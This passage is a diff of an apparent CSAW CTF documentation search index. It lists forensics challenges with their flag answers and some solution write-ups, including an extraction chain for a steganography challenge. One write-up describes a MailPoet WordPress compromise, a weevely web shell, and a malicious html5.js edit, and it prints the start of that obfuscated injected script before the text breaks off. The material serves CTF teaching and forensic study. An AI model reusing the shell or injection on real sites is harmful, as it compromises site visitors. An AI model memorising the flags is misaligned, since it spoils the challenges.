+            "location": "/challenges/2015/forensics/keep-calm-and-ctf/", 
+            "text": "Keep Calm and CTF\n\n\nAuthor\n\n\nBudofsky\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nMy friend sends me pictures before every ctf. He told me this one was special.\nNote: this flag doesn't follow the \nflag{}\n format\n\n\nFlag\n\n\nh1d1ng_in_4lm0st_pla1n_sigh7\n\n\nSolution\n\n\nSetup\n\n\nDistribute \nkeep-calm-and-ctf.jpg", 
+            "title": "Keep Calm and CTF"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/keep-calm-and-ctf/#keep-calm-and-ctf", 
+            "text": "", 
+            "title": "Keep Calm and CTF"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/keep-calm-and-ctf/#author", 
+            "text": "Budofsky", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/keep-calm-and-ctf/#points", 
+            "text": "100", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/keep-calm-and-ctf/#category", 
+            "text": "Forensics", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/keep-calm-and-ctf/#description", 
+            "text": "My friend sends me pictures before every ctf. He told me this one was special.\nNote: this flag doesn't follow the  flag{}  format", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/keep-calm-and-ctf/#flag", 
+            "text": "h1d1ng_in_4lm0st_pla1n_sigh7", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/keep-calm-and-ctf/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/keep-calm-and-ctf/#setup", 
+            "text": "Distribute  keep-calm-and-ctf.jpg", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/net/", 
+            "text": "Net/Flash\n\n\nAuthor\n\n\nBudofsky\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nI was sniffing some web traffic for a while, I think i finally got something interesting. Help me find flag through all these packets.\n\n\nFlag\n\n\nflag{li0ns_and_tig3rs_4nd_b34rs_0h_mi}\n\n\nSolution\n\n\nSetup", 
+            "title": "Transfer"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/net/#netflash", 
+            "text": "", 
+            "title": "Net/Flash"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/net/#author", 
+            "text": "Budofsky", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/net/#points", 
+            "text": "100", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/net/#category", 
+            "text": "Forensics", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/net/#description", 
+            "text": "I was sniffing some web traffic for a while, I think i finally got something interesting. Help me find flag through all these packets.", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/net/#flag", 
+            "text": "flag{li0ns_and_tig3rs_4nd_b34rs_0h_mi}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/net/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/net/#setup", 
+            "text": "", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/flash/", 
+            "text": "Flash\n\n\nAuthor\n\n\nBudofsky\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nWe were able to grab an image of a harddrive. Find out what's on it.\n\n\nFlag\n\n\nflag{b3l0w_th3_r4dar}\n\n\nSolution\n\n\nSetup\n\n\nDistribute \nflash_c8429a430278283c0e571baebca3d139.zip", 
+            "title": "Flash"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/flash/#flash", 
+            "text": "", 
+            "title": "Flash"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/flash/#author", 
+            "text": "Budofsky", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/flash/#points", 
+            "text": "100", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/flash/#category", 
+            "text": "Forensics", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/flash/#description", 
+            "text": "We were able to grab an image of a harddrive. Find out what's on it.", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/flash/#flag", 
+            "text": "flag{b3l0w_th3_r4dar}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/flash/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/flash/#setup", 
+            "text": "Distribute  flash_c8429a430278283c0e571baebca3d139.zip", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/dumpster_diving/", 
+            "text": "Dumpster Diving\n\n\nAuthor\n\n\nBudofsky\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\ndumpsters are cool, but cores are cooler\n\n\nFlag\n\n\nflag{0cb5b778715ccb6b300892e974e2f427}\n\n\nSolution\n\n\nDump of firefox memory with the string loaded in. Strings it. Grep for flag.\n\n\nSetup\n\n\nDistribute \nfirefox.mem", 
+            "title": "Dumptster Diving"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/dumpster_diving/#dumpster-diving", 
+            "text": "", 
+            "title": "Dumpster Diving"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/dumpster_diving/#author", 
+            "text": "Budofsky", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/dumpster_diving/#points", 
+            "text": "100", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/dumpster_diving/#category", 
+            "text": "Forensics", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/dumpster_diving/#description", 
+            "text": "dumpsters are cool, but cores are cooler", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/dumpster_diving/#flag", 
+            "text": "flag{0cb5b778715ccb6b300892e974e2f427}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/dumpster_diving/#solution", 
+            "text": "Dump of firefox memory with the string loaded in. Strings it. Grep for flag.", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/dumpster_diving/#setup", 
+            "text": "Distribute  firefox.mem", 
+            "title": "Setup"
+        }, 
+        {
             "location": "/challenges/2017/forensics/missed_registration/", 
             "text": "Missed Registration\n\n\nAuthor\n\n\nPoints\n\n\n150\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nIt's registration day! These forms just seem longer and longer...\n\n\nFlag\n\n\nFLAG{3Am_LaunDR3Y_FL4G_L34kz!}\n\n\nSolution\n\n\nsolve.py\n\n\nFile for challenge\n\n\ncap.pcap", 
             "title": "Best Router"
@@ -3796,6 +6176,371 @@
             "title": "Solution"
         }, 
         {
+            "location": "/challenges/2015/forensics/airport/", 
+            "text": "Airport\n\n\nAuthor\n\n\nHudson\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nWe got a bunch of photos from our contact, but can't make anything out of them.\n\n\nFlag\n\n\niH4t3A1rp0rt5\n\n\nSolution\n\n\nSetup\n\n\nDistribute \nairport_26321e6eac7a7490e527cbe27ceb68c1.zip", 
+            "title": "Airport"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/airport/#airport", 
+            "text": "", 
+            "title": "Airport"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/airport/#author", 
+            "text": "Hudson", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/airport/#points", 
+            "text": "200", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/airport/#category", 
+            "text": "Forensics", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/airport/#description", 
+            "text": "We got a bunch of photos from our contact, but can't make anything out of them.", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/airport/#flag", 
+            "text": "iH4t3A1rp0rt5", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/airport/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/airport/#setup", 
+            "text": "Distribute  airport_26321e6eac7a7490e527cbe27ceb68c1.zip", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/obscurity/", 
+            "text": "Obscurity\n\n\nAuthor\n\n\nBudofsky\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nsee or do not see\n\n\nFlag\n\n\nflag{security_through_obscurity}\n\n\nSolution\n\n\nPDF has a hidden text box in it. Doesn't show up in strings, but if you hover over it, the textbox will let you select the text and copy it out.\n\n\nSetup\n\n\nDistribute \npdf.pdf", 
+            "title": "Obscurity"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/obscurity/#obscurity", 
+            "text": "", 
+            "title": "Obscurity"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/obscurity/#author", 
+            "text": "Budofsky", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/obscurity/#points", 
+            "text": "200", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/obscurity/#category", 
+            "text": "Forensics", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/obscurity/#description", 
+            "text": "see or do not see", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/obscurity/#flag", 
+            "text": "flag{security_through_obscurity}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/obscurity/#solution", 
+            "text": "PDF has a hidden text box in it. Doesn't show up in strings, but if you hover over it, the textbox will let you select the text and copy it out.", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/obscurity/#setup", 
+            "text": "Distribute  pdf.pdf", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/why_not_sftp__/", 
+            "text": "Why not SFTP?\n\n\nAuthor\n\n\nBudofsky\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nwell seriously, why not? \n\n\nFlag\n\n\nflag{91e02cd2b8621d0c05197f645668c5c4}\n\n\nSolution\n\n\nFTP session. Extract transferred files.\n\n\nSetup\n\n\nDistribute \ntraffic-5.pcap", 
+            "title": "Why Not SFTP"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/why_not_sftp__/#why-not-sftp", 
+            "text": "", 
+            "title": "Why not SFTP?"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/why_not_sftp__/#author", 
+            "text": "Budofsky", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/why_not_sftp__/#points", 
+            "text": "200", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/why_not_sftp__/#category", 
+            "text": "Forensics", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/why_not_sftp__/#description", 
+            "text": "well seriously, why not?", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/why_not_sftp__/#flag", 
+            "text": "flag{91e02cd2b8621d0c05197f645668c5c4}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/why_not_sftp__/#solution", 
+            "text": "FTP session. Extract transferred files.", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/why_not_sftp__/#setup", 
+            "text": "Distribute  traffic-5.pcap", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/mandiant/", 
+            "text": "Mandiant\n\n\nAuthor\n\n\nD'Antoine\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nWe found this file. Help Mandiant figure out what APT1 is trying to send.\nHint: check out free_file_camouflage\n\n\nFlag\n\n\nflag{s3v3r4l_l4y3r5_d33p_\n_2m4ny_l4yers_w1d3}\n\n\nSolution\n\n\nby \npolym\n\nThis writeup is based on a writeup by \nkrx\n.\nWe are given a PDF that contains an EmbeddedFile object stream, see \n7.11.4 of the official PDF specification by Adobe\n.\nUsing \nqpdf\n and a common text editor, we can extract the embedded file (base64 encoded) in a simple manner:\n\n\n$ qpdf --qdf --object-streams\n=\ndisable Mandiant_c920fc463eaf996489749457abc9b2eb.pdf out.pdf\n\n\n\n\n\n\nWe decode it using \nbase64 --decode\n to find a PNG:\n\n\n$ cat out.b64 \n|\n tr -d \n\\n\n \n|\n b64d pic.png \n$ file pic.png\npic.png: PNG image data, \n610\n x \n467\n, \n8\n-bit/color RGBA, non-interlaced\n\n\n\n\n\nThe PNG contains a 7-zip archive, which we extract using \nscalpel\n using a modified version of \nthis config\n:\n\n\n$ binwalk pic.png \n|\n grep -v Zlib\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n\n0\n             0x0             PNG image, \n610\n x \n467\n, \n8\n-bit/color RGBA, non-interlaced\n\n160173\n        0x271AD         \n7\n-zip archive data, version \n0\n.4\n$ scalpel -vc scalpel.conf pic.png\n$ tree scalpel-output/\nscalpel-output/\n\u251c\u2500\u2500 7z-10-0\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 \n00000000\n.7z\n\u2514\u2500\u2500 audit.txt\n\n\n1\n directory, \n2\n files\n\n\n\n\n\nInside the 7z there is a JPG (also base64 encoded), which we extract using \n7z\n:\n\n\n+bash-4.3$ \ncd\n 7z-10-0/\n+bash-4.3$ ls\n\n00000000\n.7z\n+bash-4.3$ 7z x \n00000000\n.7z -oout\n\n\n7\n-Zip \n[\n64\n]\n \n9\n.20  Copyright \n(\nc\n)\n \n1999\n-2010 Igor Pavlov  \n2010\n-11-18\np7zip Version \n9\n.20 \n(\nlocale\n=\nutf8,Utf16\n=\non,HugeFiles\n=\non,8 CPUs\n)\n\n\nProcessing archive: \n00000000\n.7z\n\nExtracting  secret.txt\n\nEverything is Ok\n\nSize:       \n58375\n\nCompressed: \n43850\n\n+bash-4.3$ tree out/\nout/\n\u2514\u2500\u2500 secret.txt\n\n\n0\n directories, \n1\n file\n+bash-4.3$ file out/secret.txt \nout/secret.txt: ASCII text\n+bash-4.3$ \ncd\n out/\n+bash-4.3$ cat secret.txt \n|\n tr -d \n\\n\n \n|\n base64 --decode pic.jpg\n+bash-4.3$ file pic.jpg \npic.jpg: JPEG image data\n\n\n\n\n\nUsing any hexeditor or \nstrings\n, we find that the JPG contains two base64 encoded blobs:\n\n\n$ strings -a pic.jpg \nb#o\n]\n\nY2EB\n V~D\n\n[\n...\n]\n\n\naKxw\n\n\nS#UH\n\n\nVVGEC8uGDQuNhhk6FKg0ICF9jVAUS54zurveSzXcwE9MsIHIZPuvP6vrSDgwULy5Kvm/wPe3zxddM4SSPgvWIg==\n\n\nXQN6Y6QIpfofWw857i5DK[...]\n\n$\n strings -a pic.jpg | tail -n2 strings.b64\n\n\n\n\n\n\nHowever, both blobs do not seem to be anything obvious at first:\n\n\n$ sed \n1q;d\n strings.b64 \n|\n b64d \n|\n xxd\n\n0000000\n: \n5551\n 840b cb86 0d0b 8d86 193a 14a8 \n3420\n  UQ.........:..4 \n\n0000010\n: 217d 8d50 144b 9e33 babb de4b 35dc c04f  !\n}\n.P.K.3...K5..O\n\n0000020\n: 4cb0 81c8 64fb af3f abeb \n4838\n \n3050\n bcb9  L...d..?..H80P..\n\n0000030\n: 2af9 bfc0 f7b7 cf17 5d33 \n8492\n 3e0b d622  *.......\n]\n3\n..\n..\n\n$\n sed \n2q;d\n strings.b64 | b64d | xxd\n\n\n0000000: 5d03 7a63 a408 a5fa 1f5b 0f39 ee2e 432b  ].zc.....[.9..C+\n\n\n0000010: bd55 57e0 0cc3 7aa4 9797 c906 abc4 4e82  .UW...z.......N.\n\n\n[...]\n\n\n0003450: c273 cfa0 b5ca 8535 64b4 40a6 501e f7de  .s.....5d.@.P...\n\n\n0003460: b749 d99b 18ea 3dd7 af98 e685 295f 312e  .I....=.....)_1.\n\n\n0003470: 7a35 2b36 ca13 86a0 9265 6802 f0f8 4e3d  z5+6.....eh...N=\n\n\n\n\n\n\nAs \nthis writeup\n suggests, we have to use a program called \nFree File Camouflage\n to extract a hdden file from the blob(s) - an ELF.\nThe final step is to run the ELF to receive the flag \nflag{s3v3r4l_l4y3r5_d33p_\n_2m4ny_l4yers_w1d3}\n.\n\n\nSetup\n\n\nMandiant_c920fc463eaf996489749457abc9b2eb.pdf", 
+            "title": "Mandient"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/mandiant/#mandiant", 
+            "text": "", 
+            "title": "Mandiant"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/mandiant/#author", 
+            "text": "D'Antoine", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/mandiant/#points", 
+            "text": "300", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/mandiant/#category", 
+            "text": "Forensics", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/mandiant/#description", 
+            "text": "We found this file. Help Mandiant figure out what APT1 is trying to send.\nHint: check out free_file_camouflage", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/mandiant/#flag", 
+            "text": "flag{s3v3r4l_l4y3r5_d33p_ _2m4ny_l4yers_w1d3}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/mandiant/#solution", 
+            "text": "by  polym \nThis writeup is based on a writeup by  krx .\nWe are given a PDF that contains an EmbeddedFile object stream, see  7.11.4 of the official PDF specification by Adobe .\nUsing  qpdf  and a common text editor, we can extract the embedded file (base64 encoded) in a simple manner:  $ qpdf --qdf --object-streams = disable Mandiant_c920fc463eaf996489749457abc9b2eb.pdf out.pdf  \nWe decode it using  base64 --decode  to find a PNG:  $ cat out.b64  |  tr -d  \\n   |  b64d pic.png \n$ file pic.png\npic.png: PNG image data,  610  x  467 ,  8 -bit/color RGBA, non-interlaced  The PNG contains a 7-zip archive, which we extract using  scalpel  using a modified version of  this config :  $ binwalk pic.png  |  grep -v Zlib\nDECIMAL       HEXADECIMAL     DESCRIPTION\n-------------------------------------------------------------------------------- 0              0x0             PNG image,  610  x  467 ,  8 -bit/color RGBA, non-interlaced 160173         0x271AD          7 -zip archive data, version  0 .4\n$ scalpel -vc scalpel.conf pic.png\n$ tree scalpel-output/\nscalpel-output/\n\u251c\u2500\u2500 7z-10-0\n\u2502\u00a0\u00a0 \u2514\u2500\u2500  00000000 .7z\n\u2514\u2500\u2500 audit.txt 1  directory,  2  files  Inside the 7z there is a JPG (also base64 encoded), which we extract using  7z :  +bash-4.3$  cd  7z-10-0/\n+bash-4.3$ ls 00000000 .7z\n+bash-4.3$ 7z x  00000000 .7z -oout 7 -Zip  [ 64 ]   9 .20  Copyright  ( c )   1999 -2010 Igor Pavlov   2010 -11-18\np7zip Version  9 .20  ( locale = utf8,Utf16 = on,HugeFiles = on,8 CPUs ) \n\nProcessing archive:  00000000 .7z\n\nExtracting  secret.txt\n\nEverything is Ok\n\nSize:        58375 \nCompressed:  43850 \n+bash-4.3$ tree out/\nout/\n\u2514\u2500\u2500 secret.txt 0  directories,  1  file\n+bash-4.3$ file out/secret.txt \nout/secret.txt: ASCII text\n+bash-4.3$  cd  out/\n+bash-4.3$ cat secret.txt  |  tr -d  \\n   |  base64 --decode pic.jpg\n+bash-4.3$ file pic.jpg \npic.jpg: JPEG image data  Using any hexeditor or  strings , we find that the JPG contains two base64 encoded blobs:  $ strings -a pic.jpg \nb#o ] \nY2EB\n V~D [ ... ]  aKxw  S#UH  VVGEC8uGDQuNhhk6FKg0ICF9jVAUS54zurveSzXcwE9MsIHIZPuvP6vrSDgwULy5Kvm/wPe3zxddM4SSPgvWIg==  XQN6Y6QIpfofWw857i5DK[...] \n$  strings -a pic.jpg | tail -n2 strings.b64   However, both blobs do not seem to be anything obvious at first:  $ sed  1q;d  strings.b64  |  b64d  |  xxd 0000000 :  5551  840b cb86 0d0b 8d86 193a 14a8  3420   UQ.........:..4  0000010 : 217d 8d50 144b 9e33 babb de4b 35dc c04f  ! } .P.K.3...K5..O 0000020 : 4cb0 81c8 64fb af3f abeb  4838   3050  bcb9  L...d..?..H80P.. 0000030 : 2af9 bfc0 f7b7 cf17 5d33  8492  3e0b d622  *....... ] 3 .. .. \n$  sed  2q;d  strings.b64 | b64d | xxd  0000000: 5d03 7a63 a408 a5fa 1f5b 0f39 ee2e 432b  ].zc.....[.9..C+  0000010: bd55 57e0 0cc3 7aa4 9797 c906 abc4 4e82  .UW...z.......N.  [...]  0003450: c273 cfa0 b5ca 8535 64b4 40a6 501e f7de  .s.....5d.@.P...  0003460: b749 d99b 18ea 3dd7 af98 e685 295f 312e  .I....=.....)_1.  0003470: 7a35 2b36 ca13 86a0 9265 6802 f0f8 4e3d  z5+6.....eh...N=   As  this writeup  suggests, we have to use a program called  Free File Camouflage  to extract a hdden file from the blob(s) - an ELF.\nThe final step is to run the ELF to receive the flag  flag{s3v3r4l_l4y3r5_d33p_ _2m4ny_l4yers_w1d3} .", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/mandiant/#setup", 
+            "text": "Mandiant_c920fc463eaf996489749457abc9b2eb.pdf", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/ransomewhere/", 
+            "text": "ransomewhere\n\n\nAuthor\n\n\nSmith\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nWe got hit by some randsomware and we lost our most important file. Please help use recover it.\n- TwoSigma (Jay Smith)\n\n\nFlag\n\n\nyo mama so fat, she can't store files larger than 4 GB\n\n\nSolution\n\n\nhttps://github.com/kareemroks101/CTF-Writeups/tree/master/CSAW%2015%20Finals/for300%20-%20randsomewhere\n\n\nSetup\n\n\nrandsomewhere_0bcb28bec3683610d7048879a1374335.img.zip", 
+            "title": "Ransomwhere"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/ransomewhere/#ransomewhere", 
+            "text": "", 
+            "title": "ransomewhere"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/ransomewhere/#author", 
+            "text": "Smith", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/ransomewhere/#points", 
+            "text": "300", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/ransomewhere/#category", 
+            "text": "Forensics", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/ransomewhere/#description", 
+            "text": "We got hit by some randsomware and we lost our most important file. Please help use recover it.\n- TwoSigma (Jay Smith)", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/ransomewhere/#flag", 
+            "text": "yo mama so fat, she can't store files larger than 4 GB", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/ransomewhere/#solution", 
+            "text": "https://github.com/kareemroks101/CTF-Writeups/tree/master/CSAW%2015%20Finals/for300%20-%20randsomewhere", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/ransomewhere/#setup", 
+            "text": "randsomewhere_0bcb28bec3683610d7048879a1374335.img.zip", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/sharpturn/", 
+            "text": "Sharpturn\n\n\nAuthor\n\n\nStortz\n\n\nPoints\n\n\n400\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nI think my SATA controller is dying.\nHINT: \ngit fsck -v\n\n\nFlag\n\n\nflag{3b532e0a187006879d262141e16fa5f05f2e6752}\n\n\nSolution\n\n\nSetup", 
+            "title": "Sharpturn"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/sharpturn/#sharpturn", 
+            "text": "", 
+            "title": "Sharpturn"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/sharpturn/#author", 
+            "text": "Stortz", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/sharpturn/#points", 
+            "text": "400", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/sharpturn/#category", 
+            "text": "Forensics", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/sharpturn/#description", 
+            "text": "I think my SATA controller is dying.\nHINT:  git fsck -v", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/sharpturn/#flag", 
+            "text": "flag{3b532e0a187006879d262141e16fa5f05f2e6752}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/sharpturn/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/forensics/sharpturn/#setup", 
+            "text": "", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/aristotle_-_Wiens/", 
+            "text": "Aristotle\n\n\nAuthor\n\n\nWiens\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nHere's a PCAP, the flag you need to submit is in the form flag{wordonewordtwowordthree} where wordone, wordtwo, and wordthree are taken from the word game in the following pcap.\n\n\nFlag\n\n\nflag{observedoubledivide}\n\n\nSolution\n\n\nSetup\n\n\nNotes\n\n\nIf they need a hint, point them at: \nhttp://www.cyber1.org/pterm.asp\n\n(shouldn't be necessary since the dns resolution at the beginning gives a domain anme that is google-able as associatd with cyber1.org)\nForensics/Reverse Engineering challenge (not really RE since the source is given, but converting from the source and pcap to meaningful data requires some work. No idea on the difficulty here, should be playtested, or the scoreboard should adjust based on how many people solve or something.", 
+            "title": "Aristotle"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/aristotle_-_Wiens/#aristotle", 
+            "text": "", 
+            "title": "Aristotle"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/aristotle_-_Wiens/#author", 
+            "text": "Wiens", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/aristotle_-_Wiens/#points", 
+            "text": "300", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/aristotle_-_Wiens/#category", 
+            "text": "Forensics", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/aristotle_-_Wiens/#description", 
+            "text": "Here's a PCAP, the flag you need to submit is in the form flag{wordonewordtwowordthree} where wordone, wordtwo, and wordthree are taken from the word game in the following pcap.", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/aristotle_-_Wiens/#flag", 
+            "text": "flag{observedoubledivide}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/aristotle_-_Wiens/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/aristotle_-_Wiens/#setup", 
+            "text": "", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/aristotle_-_Wiens/#notes", 
+            "text": "If they need a hint, point them at:  http://www.cyber1.org/pterm.asp \n(shouldn't be necessary since the dns resolution at the beginning gives a domain anme that is google-able as associatd with cyber1.org)\nForensics/Reverse Engineering challenge (not really RE since the source is given, but converting from the source and pcap to meaningful data requires some work. No idea on the difficulty here, should be playtested, or the scoreboard should adjust based on how many people solve or something.", 
+            "title": "Notes"
+        }, 
+        {
+            "location": "/challenges/2014/forensics/Fluffy_No_More/", 
+            "text": "Fluffy No More\n\n\nAuthor\n\n\nAntoniweicz\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\n\"OH NO WE'VE BEEN HACKED!!!!!! -- said the Eye Heart Fluffy Bunnies Blog owner. Life was grand for the fluff fanatic until one day the site's users started to get attacked! Apparently fluffy bunnies are not just a love of fun furry families but also furtive foreign governments. The notorious \"\"Forgotten Freaks\"\" hacking group was known to be targeting high powered politicians. Were the cute bunnies the next in their long list of conquests!??\nWell... The fluff needs your stuff. I've pulled the logs from the server for you along with a backup of it's database and configuration. Figure out what is going on!\"\n\n\nFlag\n\n\nkey{Those Fluffy Bunnies Make Tummy Bumpy}\n\n\nSolution\n\n\nWithin the apache log file (/var/logs/apache2/access.log) is an indicator of attack for the MailPoet vulnerability. Details here: \nhttp://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html\n\nI dont expect people to find that really, but maybe they will. The vulnerability is exploited and uploads two files to\n\n\n/var/www/html/wp-content/uploads/wysija/themes/weblizer\n\n\n\n\n\ntemplate.php is a weevely shell. There is also a single execution command entry in the access.log of the attacker's modifications to the wordpress install, but people might not notice that either.\nThe attacker modified \n/var/www/html/wp-content/themes/twentythirteen/js/html5.js\n which only gets rendered if a user is using IE9 or below.\n\n\n!--[if lt IE 9]\n\n    \nscript src=\nhttp://blog.eyeheartfluffybunnies.com/wp-content/themes/twentythirteen/js/html5.js\n/script\n\n    \n![endif]--\n\n\n\n\n\n\nThis is not attacker added code, but naturally occuring. You can see this from the source on the webpage. My expectation is people will actually create a LAMP server to replicate and notice this condition or do a diff of the plugins/themes.\nHowever they get there, they'll hopefully notice that html5.js has a modification:\n\n\nvar g=\nti\n;var c=\nHTML Tags\n;var f=\n. li colgroup br src datalist script option .\n;f = f.split(\n \n);c=\n;k=\n/\n;m=f[6];for(var 